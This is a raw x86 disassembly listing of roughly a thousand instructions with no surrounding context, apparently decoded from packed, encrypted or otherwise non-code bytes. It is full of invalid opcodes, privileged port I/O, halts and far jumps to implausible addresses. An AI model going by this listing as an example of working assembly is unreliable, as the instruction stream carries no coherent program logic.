  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0xd8ff29ff,eax
  408b09:	mov    bh,0x1d
  408b0b:	jmp    0x7b9c:0x137b7be5
  408b12:	jnp    0x408b45
  408b14:	cmp    BYTE PTR [eax-0x4b59d14c],bl
  408b1a:	pop    edx
  408b1b:	sub    al,0xd9
  408b1d:	adc    DWORD PTR ds:0x3a226bac,edi
  408b23:	mov    ebx,0xb18395b4
  408b28:	inc    edi
  408b29:	xchg   ebx,eax
  408b2a:	enter  0x2d3b,0x3
  408b2e:	sbb    DWORD PTR [edx-0x69502ef4],ecx
  408b34:	push   ss
  408b35:	jge    0x408ac8
  408b37:	inc    ebp
  408b38:	mov    ebp,0x470472a5
  408b3d:	pop    ebp
  408b3e:	xchg   esp,eax
  408b3f:	add    al,0x9a
  408b41:	jmp    0xa364f9a5
  408b46:	push   esp
  408b47:	jb     0x408b8d
  408b49:	jne    0x408ae9
  408b4b:	in     eax,dx
  408b4c:	std    
  408b4d:	pusha  
  408b4e:	and    edx,DWORD PTR [edx-0x7f]
  408b51:	sahf   
  408b52:	std    
  408b53:	jg     0x408bcc
  408b55:	dec    ecx
  408b56:	inc    ecx
  408b57:	lods   al,BYTE PTR ds:[esi]
  408b58:	adc    ch,ah
  408b5a:	xor    DWORD PTR [ebx+0x2add483d],ebp
  408b60:	jge    0x408b36
  408b62:	sar    ch,cl
  408b64:	cdq    
  408b65:	aaa    
  408b66:	xor    al,0xc4
  408b68:	ror    cl,0x33
  408b6b:	mov    BYTE PTR [edi],ah
  408b6d:	push   esp
  408b6e:	mov    bl,0x4e
  408b70:	push   ebp
  408b71:	ror    edx,1
  408b73:	pop    edx
  408b74:	dec    esp
  408b75:	xchg   BYTE PTR [edx-0x5c4faead],dl
  408b7b:	push   0x4b
  408b7d:	scas   eax,DWORD PTR es:[edi]
  408b7e:	fnstenv [ebx]
  408b80:	mov    esp,0x175ccdcc
  408b85:	sbb    esi,DWORD PTR [edx+0x1d]
  408b88:	mov    al,ds:0x217ad4e
  408b8d:	popa   
  408b8e:	and    BYTE PTR [esp+ebp*4+0x73],dh
  408b92:	pop    ecx
  408b93:	arpl   WORD PTR gs:[ecx+0x721b382b],bx
  408b9a:	rcl    BYTE PTR [eax],cl
  408b9c:	dec    BYTE PTR [ebp+0x14]
  408b9f:	addr16 inc edx
  408ba1:	sbb    al,0xbd
  408ba3:	ret    0x3800
  408ba6:	adc    dl,BYTE PTR [ecx+0x290905f4]
  408bac:	lahf   
  408bad:	jl     0x408c0c
  408baf:	jno    0x408bfb
  408bb1:	lea    ecx,[ecx*8+0x275ab8c1]
  408bb8:	fistp  QWORD PTR [eax-0x27914d00]
  408bbe:	jo     0x408bdc
  408bc0:	adc    BYTE PTR [edx+0x350ff040],ch
  408bc6:	outs   dx,DWORD PTR ds:[esi]
  408bc7:	dec    edi
  408bc8:	out    dx,al
  408bc9:	add    edi,DWORD PTR [eax+0x45]
  408bcc:	jno    0x408bc9
  408bce:	or     bh,dh
  408bd0:	inc    esi
  408bd1:	jno    0x408b7e
  408bd3:	je     0x408b82
  408bd5:	pop    ss
  408bd6:	push   eax
  408bd7:	(bad)  
  408bd8:	sbb    eax,0x557a4805
  408bdd:	inc    edi
  408bde:	retf   0x1953
  408be1:	mov    al,0xe8
  408be3:	add    esp,DWORD PTR [ebp-0x4]
  408be6:	jmp    0xd670:0x6fb5774f
  408bed:	mov    ebx,0x188a875b
  408bf2:	inc    eax
  408bf3:	cmp    DWORD PTR [edi],ecx
  408bf5:	or     eax,0xd4f37632
  408bfa:	mov    DWORD PTR [esi-0x286e079d],esp
  408c00:	fisub  WORD PTR [esi+0x2ca21cbf]
  408c06:	scas   eax,DWORD PTR es:[edi]
  408c07:	xor    al,0x50
  408c09:	fwait
  408c0a:	xchg   ecx,eax
  408c0b:	ja     0x408c49
  408c0d:	xchg   DWORD PTR [ecx],ebp
  408c0f:	enter  0x6c82,0x28
  408c13:	push   0xb400e3dc
  408c18:	cld    
  408c19:	cwde   
  408c1a:	mov    al,0xcf
  408c1c:	sbb    eax,0x9c618765
  408c21:	and    eax,0x5cdd4c38
  408c26:	mov    ebx,0x1d3e9a06
  408c2b:	dec    esi
  408c2c:	jae    0x408ca1
  408c2e:	sbb    ch,bl
  408c30:	lea    esp,[edi-0x342830c0]
  408c36:	inc    ebx
  408c37:	sbb    cl,BYTE PTR [ecx+esi*2-0x1e87e560]
  408c3e:	rcl    DWORD PTR [esi-0x7da65a40],0xb1
  408c45:	loop   0x408c8c
  408c47:	sti    
  408c48:	add    cl,BYTE PTR [edx]
  408c4a:	mov    ebp,0x7dd380e7
  408c4f:	icebp  
  408c50:	call   0xa800:0x588ba518
  408c57:	cld    
  408c58:	into   
  408c59:	xchg   ebp,eax
  408c5a:	mov    eax,0x7790c930
  408c5f:	sub    DWORD PTR [edx+0x21],eax
  408c62:	inc    esp
  408c63:	xchg   DWORD PTR [eax+ebx*1-0x63573473],eax
  408c6a:	push   ebp
  408c6b:	fisub  DWORD PTR [ebx]
  408c6d:	out    dx,al
  408c6e:	jl     0x408ce9
  408c70:	jbe    0x408c2c
  408c72:	push   esp
  408c73:	repnz cmp DWORD PTR [ecx-0x48587428],ebp
  408c7a:	fld    TBYTE PTR [edx]
  408c7c:	test   BYTE PTR [esp+ecx*2+0x5f080b59],dl
  408c83:	pop    ds
  408c84:	hlt    
  408c85:	in     eax,dx
  408c86:	xchg   esi,eax
  408c87:	cmp    ebp,DWORD PTR [ecx-0x18365dad]
  408c8d:	mov    ebp,0x7c572a07
  408c92:	pop    eax
  408c93:	adc    BYTE PTR [ebx],bh
  408c95:	lods   eax,DWORD PTR ds:[esi]
  408c96:	cli    
  408c97:	push   esp
  408c98:	push   cs
  408c99:	dec    ebp
  408c9a:	aam    0xb7
  408c9c:	loop   0x408d14
  408c9e:	and    edi,DWORD PTR [edx]
  408ca0:	cmp    esp,ebp
  408ca2:	sub    ah,dl
  408ca4:	and    al,0xa
  408ca6:	xlat   BYTE PTR ds:[ebx]
  408ca7:	je     0x408c4f
  408ca9:	sbb    al,0xc9
  408cab:	mov    al,0x9d
  408cad:	fwait
  408cae:	push   ebx
  408caf:	sub    eax,0xa9122d99
  408cb4:	mov    ch,0x39
  408cb6:	in     eax,0xa6
  408cb8:	retf   0xafea
  408cbb:	mov    al,ds:0xdefb8afd
  408cc0:	sub    esi,DWORD PTR [edi+0x18]
  408cc3:	sar    BYTE PTR [ebx+0x11451461],0xc8
  408cca:	test   BYTE PTR [esp+eax*8-0x18],0x8f
  408ccf:	je     0x408d0a
  408cd1:	inc    eax
  408cd2:	cli    
  408cd3:	repz xor ebx,DWORD PTR [ecx-0x2e]
  408cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cd8:	aad    0x36
  408cda:	push   0x65a93dbe
  408cdf:	into   
  408ce0:	bound  eax,QWORD PTR [edx]
  408ce2:	dec    eax
  408ce3:	mov    bh,0xe4
  408ce5:	cwde   
  408ce6:	adc    BYTE PTR ds:0x8d0db93f,0xc1
  408ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cee:	iret   
  408cef:	and    DWORD PTR [ecx-0x35b1696b],ebp
  408cf5:	pop    esp
  408cf6:	jl     0x408cfd
  408cf8:	data16 cmc 
  408cfa:	test   al,0x64
  408cfc:	add    eax,0x5ad76ad
  408d01:	out    0x37,al
  408d03:	mov    ds:0x96e2314c,al
  408d08:	xchg   ebx,eax
  408d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d0a:	push   esp
  408d0b:	cdq    
  408d0c:	in     al,0xf3
  408d0e:	jle    0x408d76
  408d10:	mov    dh,BYTE PTR [ebp+0x7b]
  408d13:	ds aad 0xec
  408d16:	pop    esi
  408d17:	in     eax,dx
  408d18:	push   edx
  408d19:	fsubr  QWORD PTR [ebx+0x7f]
  408d1c:	push   ecx
  408d1d:	jnp    0x408cf1
  408d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d20:	outs   dx,DWORD PTR ds:[esi]
  408d21:	and    DWORD PTR [ebx+0x2d],edx
  408d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d25:	pop    ss
  408d26:	dec    ebx
  408d27:	les    ebx,FWORD PTR [edx-0x5a]
  408d2a:	out    dx,eax
  408d2b:	inc    esi
  408d2c:	out    dx,eax
  408d2d:	fisttp WORD PTR [ebx-0x624f3125]
  408d33:	add    DWORD PTR [ecx-0x58],esi
  408d36:	mov    ss,edi
  408d38:	test   edx,0x6c1f12ad
  408d3e:	shl    BYTE PTR [edx+0x6c82b8cd],cl
  408d44:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408d46:	mov    WORD PTR [ebx-0x4a56db25],gs
  408d4c:	dec    edx
  408d4d:	dec    edx
  408d4e:	or     cl,BYTE PTR [eax]
  408d50:	xor    BYTE PTR [esi-0x8],0x60
  408d54:	push   es
  408d55:	test   eax,0xc7ed0ca0
  408d5a:	mov    al,0x86
  408d5c:	shl    DWORD PTR [eax+0x44],0x54
  408d60:	ret    0x2a9c
  408d63:	loopne 0x408d90
  408d65:	push   ds
  408d66:	hlt    
  408d67:	mov    edx,0x9ec4f293
  408d6c:	cdq    
  408d6d:	test   eax,0x10ad7143
  408d72:	cmp    dh,dl
  408d74:	dec    edi
  408d75:	maxps  xmm7,XMMWORD PTR [esi+0x50]
  408d79:	(bad)  
  408d7a:	leave  
  408d7b:	dec    eax
  408d7c:	push   es
  408d7d:	pop    edi
  408d7e:	adc    eax,0x18deaf42
  408d83:	pop    es
  408d84:	rcl    BYTE PTR [esi+ebp*8],1
  408d87:	sub    DWORD PTR [eax-0x31ef40d6],esi
  408d8d:	add    ecx,esi
  408d8f:	icebp  
  408d90:	call   DWORD PTR [ebx-0x38a94919]
  408d96:	or     ah,BYTE PTR [edi+0x3c880c00]
  408d9c:	js     0x408d95
  408d9e:	pusha  
  408d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408da0:	imul   ecx,DWORD PTR [esi],0x79bbc266
  408da6:	out    0x3e,al
  408da8:	mov    esi,0xd5ae24b
  408dad:	scas   al,BYTE PTR es:[edi]
  408dae:	popf   
  408daf:	pusha  
  408db0:	(bad)  
  408db1:	clc    
  408db2:	inc    esp
  408db3:	sbb    BYTE PTR [eax+edx*2+0x38f65f7d],bh
  408dba:	cmp    eax,0xbfe64905
  408dbf:	add    DWORD PTR [esi-0xbcea74c],ecx
  408dc5:	icebp  
  408dc6:	and    BYTE PTR [edi],ah
  408dc8:	sub    al,0x23
  408dca:	scas   al,BYTE PTR es:[edi]
  408dcb:	cmp    dl,dh
  408dcd:	or     BYTE PTR [eax],ch
  408dcf:	test   al,0x5d
  408dd1:	(bad)  
  408dd2:	mov    ebp,0x9498c405
  408dd7:	pushf  
  408dd8:	mov    bl,0x96
  408dda:	dec    edi
  408ddb:	mov    ebp,0x76eed990
  408de0:	sub    edi,DWORD PTR [edi]
  408de2:	sub    ebx,DWORD PTR [edx]
  408de4:	sbb    esi,DWORD PTR [ebx-0x41]
  408de7:	adc    eax,0x58a52f14
  408dec:	sbb    BYTE PTR [ebx+0x5170d18f],cl
  408df2:	lea    esp,[edx+eax*8-0x2b]
  408df6:	xor    bh,BYTE PTR [esi-0xb131048]
  408dfc:	test   al,0xd4
  408dfe:	repnz cmp ch,BYTE PTR [eax-0x16]
  408e02:	int    0x2c
  408e04:	ds jmp 0x787f:0xf9dbbd5e
  408e0c:	das    
  408e0d:	inc    ebp
  408e0e:	in     eax,dx
  408e0f:	popf   
  408e10:	sub    cl,ch
  408e12:	sub    BYTE PTR [ebp-0x3d0a1995],dl
  408e18:	pushf  
  408e19:	cmp    bh,BYTE PTR [edx-0x75]
  408e1c:	dec    ebx
  408e1d:	out    0xee,eax
  408e1f:	pop    ds
  408e20:	push   ss
  408e21:	sbb    al,0xd1
  408e23:	in     al,dx
  408e24:	cli    
  408e25:	pop    edx
  408e26:	sub    al,0x27
  408e28:	popf   
  408e29:	ss adc ebx,ebp
  408e2c:	pop    esp
  408e2d:	cwde   
  408e2e:	and    ch,ah
  408e30:	mov    esi,0xc54aceb5
  408e35:	xchg   DWORD PTR [ecx],edx
  408e37:	aaa    
  408e38:	repnz loop 0x408eaf
  408e3b:	loope  0x408dee
  408e3d:	or     BYTE PTR [edi+edx*1-0x7069a400],ch
  408e44:	jae    0x408e94
  408e46:	popa   
  408e47:	int3   
  408e48:	adc    bh,BYTE PTR [edi+edx*8]
  408e4b:	test   eax,0x3c890c70
  408e50:	fisubr DWORD PTR [edx]
  408e52:	dec    ebx
  408e53:	xor    BYTE PTR [edx-0x11],dh
  408e56:	mov    ebx,0x91ce4ada
  408e5b:	fbstp  TBYTE PTR [ebx]
  408e5d:	js     0x408e53
  408e5f:	(bad)  
  408e60:	call   0x815e001
  408e65:	out    dx,al
  408e66:	jmp    0xba44:0xd951681
  408e6d:	(bad)  
  408e6e:	pop    ebp
  408e6f:	outs   dx,BYTE PTR ds:[esi]
  408e70:	mov    edi,0xb0b0890c
  408e75:	ja     0x408ea8
  408e77:	fldenv [ebp-0x23]
  408e7a:	sbb    ah,BYTE PTR [edi+0x26d293c6]
  408e80:	(bad)  
  408e81:	mov    cl,0x9d
  408e83:	out    0x9a,al
  408e85:	adc    DWORD PTR [eax],edi
  408e87:	ja     0x408ebc
  408e89:	mov    ecx,0x5c076dac
  408e8e:	or     DWORD PTR [ebp-0x6cfae3ff],esi
  408e94:	and    edx,esi
  408e96:	dec    esi
  408e97:	xchg   ebx,eax
  408e98:	xlat   BYTE PTR ds:[ebx]
  408e99:	dec    esi
  408e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e9b:	jo     0x408f0d
  408e9d:	out    dx,al
  408e9e:	rcr    DWORD PTR [ebx-0x22],0x9b
  408ea2:	cmp    DWORD PTR [esi-0x5],edx
  408ea5:	xchg   DWORD PTR [ebx+0x7dcfecbf],esp
  408eab:	xchg   edi,eax
  408eac:	test   eax,0x9641a75
  408eb1:	js     0x408f31
  408eb3:	fmul   st,st(6)
  408eb5:	mov    eax,0x2796933b
  408eba:	lock retf 
  408ebc:	cmp    BYTE PTR [ebp+0x4d5d97a3],cl
  408ec2:	int    0xf
  408ec4:	push   0x2
  408ec6:	mov    edx,0x8ba0e79a
  408ecb:	shl    DWORD PTR [edi+0x10e8666c],cl
  408ed1:	inc    esi
  408ed2:	ror    DWORD PTR [esi-0x87f262b],0x69
  408ed9:	mov    ecx,cs
  408edb:	xor    esp,eax
  408edd:	ds push esi
  408edf:	push   es
  408ee0:	or     ch,BYTE PTR [esi-0x512c5f0e]
  408ee6:	loope  0x408f06
  408ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee9:	jl     0x408ef6
  408eeb:	sbb    eax,0x87bac0cd
  408ef0:	sti    
  408ef1:	cmp    al,0x55
  408ef3:	push   ebx
  408ef4:	aaa    
  408ef5:	(bad)  
  408ef6:	xchg   ebx,eax
  408ef7:	in     al,dx
  408ef8:	inc    ebp
  408ef9:	and    eax,0xd285e814
  408efe:	push   eax
  408eff:	lods   eax,DWORD PTR ds:[esi]
  408f00:	pop    eax
  408f01:	adc    cl,BYTE PTR [ebp-0x2a4a51dd]
  408f07:	sub    BYTE PTR [ebx],bh
  408f09:	dec    ebp
  408f0a:	es mov cl,dl
  408f0d:	pop    ds
  408f0e:	imul   eax,DWORD PTR [esi],0xef085a3a
  408f14:	int3   
  408f15:	pop    ecx
  408f16:	dec    eax
  408f17:	les    eax,FWORD PTR [ebp+0x7e]
  408f1a:	mov    ebp,0xd968659c
  408f1f:	jle    0x408f65
  408f21:	pop    es
  408f22:	sbb    al,0xb1
  408f24:	cmp    al,BYTE PTR [ebx-0x28]
  408f27:	hlt    
  408f28:	xchg   ebx,eax
  408f29:	adc    al,BYTE PTR [edi+0x3b581437]
  408f2f:	pop    ebx
  408f30:	or     cl,BYTE PTR [esi+0x1d142a5]
  408f36:	push   0x68
  408f38:	mov    ds:0xac0869fe,al
  408f3d:	test   BYTE PTR [ebx],dl
  408f3f:	mov    ebp,0xe61d1d4e
  408f44:	jmp    0xe66f690a
  408f49:	fcmove st,st(2)
  408f4b:	jnp    0x408f7f
  408f4d:	dec    ebx
  408f4e:	add    al,BYTE PTR [edx+0x24]
  408f51:	mov    bl,0xb9
  408f53:	fs daa 
  408f55:	inc    edx
  408f56:	jmp    0x408f60
  408f58:	xor    al,0x69
  408f5a:	sub    al,BYTE PTR [ebx+0x3cacce40]
  408f60:	imul   ebp,DWORD PTR [eax-0x5],0x55
  408f64:	inc    ebp
  408f65:	fsub   DWORD PTR [ecx+eiz*1]
  408f68:	fsub   QWORD PTR [ebx+0x13]
  408f6b:	mov    ch,0x30
  408f6d:	and    al,0xf5
  408f6f:	xlat   BYTE PTR ds:[bx]
  408f71:	into   
  408f72:	and    DWORD PTR [edi+edi*4-0x7],esp
  408f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f77:	cmp    eax,0xb21a736d
  408f7c:	jge    0x408f2f
  408f7e:	in     eax,dx
  408f7f:	shl    ah,0x50
  408f82:	jne    0x408f2d
  408f84:	and    ah,dl
  408f86:	sbb    al,0xe0
  408f88:	pop    ebx
  408f89:	dec    esp
  408f8a:	inc    ecx
  408f8b:	ret    0x67cb
  408f8e:	push   es
  408f8f:	add    dl,BYTE PTR [edx-0x78]
  408f92:	jb     0x408f64
  408f94:	mov    dh,0x3d
  408f96:	inc    ebp
  408f97:	lods   eax,DWORD PTR ds:[esi]
  408f98:	inc    edi
  408f99:	and    eax,0x2f8f057d
  408f9e:	xchg   esp,eax
  408f9f:	xchg   ecx,eax
  408fa0:	mov    ds:0xb8660e48,al
  408fa5:	stc    
  408fa6:	popf   
  408fa7:	out    dx,al
  408fa8:	(bad)  
  408faa:	nop
  408fab:	lods   al,BYTE PTR ds:[esi]
  408fac:	mov    esi,0xc973809
  408fb1:	imul   esp,edi,0x388146b3
  408fb7:	xlat   BYTE PTR ds:[ebx]
  408fb8:	in     al,0x53
  408fba:	dec    ecx
  408fbb:	in     al,dx
  408fbc:	dec    ebx
  408fbd:	jnp    0x408fad
  408fbf:	xchg   ecx,eax
  408fc0:	mov    ds:0xbe1655f,al
  408fc5:	ret    
  408fc6:	sbb    BYTE PTR [ebx],ch
  408fc8:	scas   al,BYTE PTR es:[edi]
  408fc9:	jne    0x408f83
  408fcb:	sbb    DWORD PTR [ebp+0x2],ebp
  408fce:	ss ret 
  408fd0:	outs   dx,BYTE PTR ds:[esi]
  408fd1:	(bad)  [edi]
  408fd3:	jae    0x408f98
  408fd5:	hlt    
  408fd6:	loopne 0x409038
  408fd8:	frstor [esp+ebx*4]
  408fdb:	or     DWORD PTR [eax+0x2ea409f6],eax
  408fe1:	les    ebx,FWORD PTR [eax]
  408fe3:	jle    0x408f72
  408fe5:	cmp    al,0xc9
  408fe7:	enter  0x16e3,0x19
  408feb:	cmp    al,0xf6
  408fed:	mov    dl,0x3b
  408fef:	push   0x66
  408ff1:	cmp    al,0x33
  408ff3:	push   edx
  408ff4:	cmp    eax,0x7b79c925
  408ff9:	push   ebp
  408ffa:	ret    
  408ffb:	xchg   DWORD PTR [ecx+0x4cc5db3f],ecx
  409001:	and    eax,0x60bfd94c
  409006:	sbb    eax,0x1b7b044c
  40900b:	sbb    esp,DWORD PTR [ebx]
  40900d:	mov    eax,0xd7fb4e63
  409012:	div    BYTE PTR [ebp+0x4f6629d0]
  409018:	outs   dx,BYTE PTR ds:[esi]
  409019:	sbb    DWORD PTR [esi+eiz*8-0x3f],0x6762c4a9
  409021:	push   0xddd18f38
  409026:	mov    edi,0x8035b14
  40902b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40902c:	sbb    DWORD PTR [ebx-0x77],0xfffffffb
  409030:	out    0x6c,eax
  409032:	sahf   
  409033:	fmul   QWORD PTR [ebx]
  409035:	lahf   
  409036:	mov    esp,DWORD PTR [esi+esi*1-0x4ab1092c]
  40903d:	mov    esi,0x557c22bb
  409042:	jae    0x408ffe
  409044:	fldcw  WORD PTR [edi]
  409046:	hlt    
  409047:	test   al,0x6a
  409049:	sti    
  40904a:	inc    ebx
  40904b:	and    DWORD PTR [edi],ebx
  40904d:	cli    
  40904e:	add    ebx,esi
  409050:	xchg   ecx,eax
  409051:	daa    
  409052:	pop    esp
  409053:	stos   DWORD PTR es:[edi],eax
  409054:	adc    al,0x4b
  409056:	xlat   BYTE PTR ds:[ebx]
  409057:	mov    edx,esi
  409059:	cmc    
  40905a:	rcl    DWORD PTR [eax+edi*1+0x19],1
  40905e:	and    eax,0xe0bb8218
  409063:	inc    edx
  409064:	lods   eax,DWORD PTR ds:[esi]
  409065:	jnp    0x40907a
  409067:	sbb    eax,0x9e8b6ba2
  40906c:	and    al,0x44
  40906e:	imul   eax,DWORD PTR [edi-0x6a],0xffffffb9
  409072:	jae    0x409045
  409074:	idiv   ebx
  409076:	stos   DWORD PTR es:[edi],eax
  409077:	jbe    0x409025
  409079:	mov    al,0x6c
  40907c:	mov    dl,0x84
  40907e:	adc    cl,ch
  409080:	inc    ebp
  409081:	jg     0x4090b0
  409083:	inc    esi
  409084:	sbb    BYTE PTR [eax],ch
  409086:	mov    edi,0x5e283ba9
  40908b:	cmp    ebx,DWORD PTR [edx+0x4069acac]
  409091:	daa    
  409092:	mov    ebp,0x12db85c0
  409097:	test   eax,0x44386656
  40909c:	or     BYTE PTR [edi-0x7c903886],cl
  4090a2:	pop    eax
  4090a3:	out    0xea,eax
  4090a5:	or     BYTE PTR [edx],dl
  4090a7:	jle    0x409034
  4090a9:	mov    dh,0xb2
  4090ab:	sar    al,0x13
  4090ae:	daa    
  4090af:	sub    DWORD PTR [edi+edi*1-0x11],0x7580c454
  4090b7:	cmp    eax,0xd4a42e17
  4090bc:	sub    DWORD PTR [ebp+0x27],ebp
  4090bf:	(bad)  
  4090c1:	cwde   
  4090c2:	pop    ss
  4090c3:	cmp    DWORD PTR ds:0x4f4abd82,eax
  4090c9:	in     al,0xf8
  4090cb:	fidiv  DWORD PTR [eax+0x1d]
  4090ce:	ds xor al,0x7d
  4090d1:	div    DWORD PTR [edx+0x48aa8e10]
  4090d7:	mov    bl,0x1
  4090d9:	repnz out dx,al
  4090db:	jbe    0x409109
  4090dd:	sahf   
  4090de:	loop   0x409119
  4090e0:	jmp    0x4090cc
  4090e2:	add    DWORD PTR ds:0xc03cd5b5,ecx
  4090e8:	loope  0x4090d7
  4090ea:	pop    esp
  4090eb:	cmp    BYTE PTR [esi+0x37b3f059],0x30
  4090f2:	mov    ecx,0x9ab20a8b
  4090f7:	mov    WORD PTR [eax],fs
  4090f9:	jb     0x409138
  4090fb:	rcl    DWORD PTR [ecx+0x534a7c39],1
  409101:	mov    esp,0x1898d0fa
  409106:	popa   
  409107:	iret   
  409108:	jmp    0x8ba:0x5aab6003
  40910f:	push   ebp
  409110:	(bad)  
  409111:	loopne 0x409144
  409113:	lds    eax,FWORD PTR [eax+0x5c]
  409116:	xchg   edi,eax
  409117:	inc    ebp
  409118:	in     al,dx
  409119:	inc    eax
  40911a:	xchg   cl,dh
  40911c:	hlt    
  40911d:	jne    0x40917a
  40911f:	sbb    eax,0xa65218d3
  409124:	out    dx,eax
  409125:	xchg   edi,eax
  409126:	pop    esp
  409127:	mov    al,0x87
  409129:	mov    al,ds:0x98f76df9
  40912e:	mov    ch,0x49
  409130:	and    edx,DWORD PTR [esp+edi*8+0x17]
  409134:	or     al,BYTE PTR ds:0xb488b7f8
  40913a:	ror    BYTE PTR [ecx-0x55],cl
  40913d:	cli    
  40913e:	nop
  40913f:	inc    eax
  409140:	rol    DWORD PTR [eax-0x3c],0xdd
  409144:	pop    eax
  409145:	ds repz leave 
  409148:	xchg   ebx,eax
  409149:	lods   eax,DWORD PTR ds:[esi]
  40914a:	mov    al,ds:0x451c12ee
  40914f:	jmp    0x37f6:0xbc9c34b6
  409156:	xor    al,0x39
  409158:	pop    esi
  409159:	lock pop ecx
  40915b:	test   al,0x3
  40915d:	fcom   QWORD PTR [esi]
  40915f:	les    esp,FWORD PTR [eax+0x5e]
  409162:	js     0x409192
  409164:	inc    edx
  409165:	pop    eax
  409166:	adc    DWORD PTR [edx-0x40631cb3],ecx
  40916c:	(bad)  
  40916d:	xchg   ebp,eax
  40916e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409170:	popf   
  409171:	(bad)  
  409172:	xlat   BYTE PTR ds:[ebx]
  409173:	push   esi
  409174:	stos   DWORD PTR es:[edi],eax
  409175:	out    dx,eax
  409176:	(bad)  
  409178:	lahf   
  409179:	dec    ebx
  40917a:	dec    esp
  40917b:	xchg   edi,eax
  40917c:	adc    al,0x19
  40917e:	lahf   
  40917f:	xchg   esp,eax
  409180:	or     cl,BYTE PTR [esp+eiz*8+0x52dec139]
  409187:	cdq    
  409188:	bound  edi,QWORD PTR [eax+0x44381f8f]
  40918e:	push   0xc209ae24
  409193:	fs pop ds
  409195:	leave  
  409196:	jmp    0x4091c6
  409198:	neg    dl
  40919a:	ds fwait
  40919c:	(bad)  
  40919d:	out    dx,eax
  40919e:	mov    esp,0x2721bde9
  4091a3:	jmp    0x423d:0xf5f0c4d1
  4091aa:	fldcw  WORD PTR [ecx-0x37]
  4091ad:	into   
  4091ae:	imul   esp,esi,0x74af486f
  4091b4:	loope  0x4091d3
  4091b6:	jae    0x40920b
  4091b8:	and    eax,0xb1842978
  4091bd:	dec    ebx
  4091be:	sub    BYTE PTR [ecx+0x9d2aba5],bh
  4091c4:	clc    
  4091c5:	jae    0x4091b4
  4091c7:	push   0xffffff98
  4091c9:	or     al,0x49
  4091cb:	sbb    dl,ch
  4091cd:	push   0xffffffb6
  4091cf:	mov    BYTE PTR [ebp+0x52],bh
  4091d2:	push   eax
  4091d3:	mov    dh,BYTE PTR [edx+0x1008ec87]
  4091d9:	xor    ebx,DWORD PTR [ecx+0x651b4056]
  4091df:	xor    al,0x33
  4091e1:	jle    0x40924d
  4091e3:	aaa    
  4091e4:	retf   0x8c90
  4091e7:	adc    eax,0x5eb876d6
  4091ec:	mov    cl,bh
  4091ee:	mov    ah,0x53
  4091f0:	call   0x2a2e79e4
  4091f5:	jns    0x409207
  4091f7:	sbb    al,0x99
  4091f9:	das    
  4091fa:	fwait
  4091fb:	jle    0x409228
  4091fd:	jns    0x409204
  4091ff:	xchg   BYTE PTR [edx-0x42],cl
  409202:	pop    ss
  409203:	aas    
  409204:	int    0x93
  409206:	mov    dl,BYTE PTR [edi]
  409208:	sahf   
  409209:	in     al,0x7c
  40920b:	nop
  40920c:	xor    BYTE PTR [eax-0x5e],cl
  40920f:	dec    edi
  409210:	cmp    DWORD PTR [edx],ebp
  409212:	dec    edi
  409213:	push   ds
  409214:	add    edi,DWORD PTR [edx-0x3871ac1]
  40921a:	inc    esi
  40921b:	out    dx,al
  40921c:	push   esp
  40921d:	rcl    ebx,cl
  40921f:	repnz or ch,bl
  409222:	mov    eax,es
  409224:	inc    eax
  409225:	dec    esp
  409226:	xchg   esi,eax
  409227:	test   al,0xa9
  409229:	xchg   ebp,eax
  40922a:	ss or  al,0x50
  40922d:	je     0x4091db
  40922f:	test   DWORD PTR [ecx],esi
  409231:	(bad)  
  409232:	pop    esi
  409233:	outs   dx,BYTE PTR ds:[esi]
  409234:	mov    ch,BYTE PTR [ecx]
  409236:	addr16 out 0x22,eax
  409239:	fdiv   QWORD PTR [ebp+edx*4-0x10c76729]
  409240:	cwde   
  409241:	sbb    al,0xbf
  409243:	xchg   BYTE PTR [ecx+0x75413341],ah
  409249:	sbb    eax,0xe8170496
  40924e:	(bad)  
  409250:	repnz pop ds
  409252:	hlt    
  409253:	xchg   ebp,eax
  409254:	sub    eax,0xa4890352
  409259:	call   0xcf58ee03
  40925e:	push   ebx
  40925f:	mov    esi,0xe972fbb0
  409264:	sub    eax,0x8681c058
  409269:	inc    esp
  40926a:	jge    0x409277
  40926c:	jecxz  0x4092a9
  40926e:	dec    esi
  40926f:	and    DWORD PTR ds:0x2e1dc9f6,edx
  409275:	add    bl,BYTE PTR [edx]
  409277:	sti    
  409278:	mov    ah,0x10
  40927a:	mov    eax,ds:0xa8a48c90
  40927f:	loopne 0x4092dd
  409281:	stos   BYTE PTR es:[edi],al
  409282:	adc    BYTE PTR [edi+0x65],dl
  409285:	pusha  
  409286:	ret    
  409287:	jo     0x4092ee
  409289:	test   edx,ebp
  40928b:	and    ebp,esp
  40928d:	push   ecx
  40928e:	xchg   ebp,eax
  40928f:	retf   
  409290:	ret    0xe17f
  409293:	ret    
  409294:	cmp    eax,edx
  409296:	mov    esi,edx
  409298:	loop   0x4092f1
  40929a:	fist   WORD PTR [ebp+0x1b]
  40929d:	aas    
  40929e:	mov    al,0x61
  4092a0:	xor    bh,BYTE PTR [edi+0x68]
  4092a3:	mov    bh,0xac
  4092a5:	sub    edx,DWORD PTR [esp+eax*8-0x21]
  4092a9:	ins    BYTE PTR es:[edi],dx
  4092aa:	inc    esp
  4092ab:	iret   
  4092ac:	mov    bl,0x4d
  4092ae:	shl    BYTE PTR [ebx],0xcb
  4092b1:	mov    eax,DWORD PTR [ecx+0x40]
  4092b4:	xchg   DWORD PTR [esi],esp
  4092b6:	xor    cl,BYTE PTR [ebp-0x28ecabcd]
  4092bc:	sub    bh,BYTE PTR [ecx+0x58]
  4092bf:	inc    ebx
  4092c0:	(bad)  
  4092c1:	push   ebx
  4092c2:	je     0x409254
